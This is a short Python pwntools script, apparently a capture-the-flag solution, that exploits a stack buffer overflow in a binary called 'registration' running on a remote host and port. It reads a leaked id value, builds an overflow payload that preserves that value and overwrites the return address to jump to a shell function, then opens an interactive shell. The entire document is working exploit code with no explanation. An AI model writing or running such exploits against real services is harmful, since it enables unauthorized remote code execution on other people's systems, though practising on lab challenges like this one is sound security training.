from pwn import *

sh = 0x4007d6
#r = process('registration')
r = remote('140.110.112.77', 6128)
id_ = int(r.recvuntil('Name:').strip().split('\n')[1].split(':')[1].strip())
raw_input('debug')
r.sendline('a' * 0x1c + p32(id_) + 'a' * 8 + p64(0x4008fe) + p64(sh))
r.recvuntil('email:')
r.sendline('aa')
r.interactive()
